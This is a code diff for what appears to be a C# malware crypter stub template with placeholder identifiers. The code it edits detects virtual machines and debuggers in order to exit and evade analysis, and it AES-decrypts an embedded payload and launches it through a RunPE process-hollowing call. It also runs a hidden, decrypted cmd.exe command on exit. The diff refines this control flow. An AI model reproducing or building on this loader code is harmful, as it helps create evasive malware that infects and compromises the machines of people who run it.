@@ -28,7 +28,8 @@ namespace namespace_name
                 File.Copy(batpath, newpath, true);
                 File.Delete(batpath);
                 Process.Start(newpath);
-                exitfunction_name(1);
+                exitfunction_name();
+                return;
             }
 #endif
 
@@ -40,7 +41,8 @@ namespace namespace_name
                 string manufacturer = inst["Manufacturer"].ToString().ToLower();
                 if ((manufacturer == "microsoft corporation" && inst["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || manufacturer.Contains("vmware") || inst["Model"].ToString() == "VirtualBox")
                 {
-                    exitfunction_name(1);
+                    exitfunction_name();
+                    return;
                 }
             }
             searcher.Dispose();
@@ -55,7 +57,11 @@ namespace namespace_name
             isdebuggerpresent_name IsDebuggerPresent = (isdebuggerpresent_name)Marshal.GetDelegateForFunctionPointer(idpaddr, typeof(isdebuggerpresent_name));
             bool remotedebug = false;
             CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref remotedebug);
-            if (Debugger.IsAttached || remotedebug || IsDebuggerPresent()) exitfunction_name(1);
+            if (Debugger.IsAttached || remotedebug || IsDebuggerPresent())
+            {
+                exitfunction_name();
+                return;
+            }
 #endif
 
             string payloadstr = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("payloadexe_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
@@ -89,7 +95,7 @@ namespace namespace_name
             string runpefunction = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("runpefunction_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
             runpe.GetType(runpeclass).GetMethod(runpefunction).Invoke(null, new object[]
             {
-                Path.ChangeExtension(currentfilename, null),
+                Path.ChangeExtension(field_name, null),
                 payload,
                 targs
             }); 
@@ -98,10 +104,10 @@ namespace namespace_name
             try { entry.Invoke(null, new object[] { targs }); }
             catch { entry.Invoke(null, null); }
 #endif
-            exitfunction_name(0);
+            exitfunction_name();
         }
 
-        static void exitfunction_name(int exitcode)
+        static void exitfunction_name()
         {
             string cmdstr = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("cmdcommand_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
             Process.Start(new ProcessStartInfo()
@@ -111,7 +117,6 @@ namespace namespace_name
                 CreateNoWindow = true,
                 FileName = "cmd.exe"
             });
-            Environment.Exit(exitcode);
         }
 
         static byte[] aesfunction_name(byte[] input, byte[] key, byte[] iv)
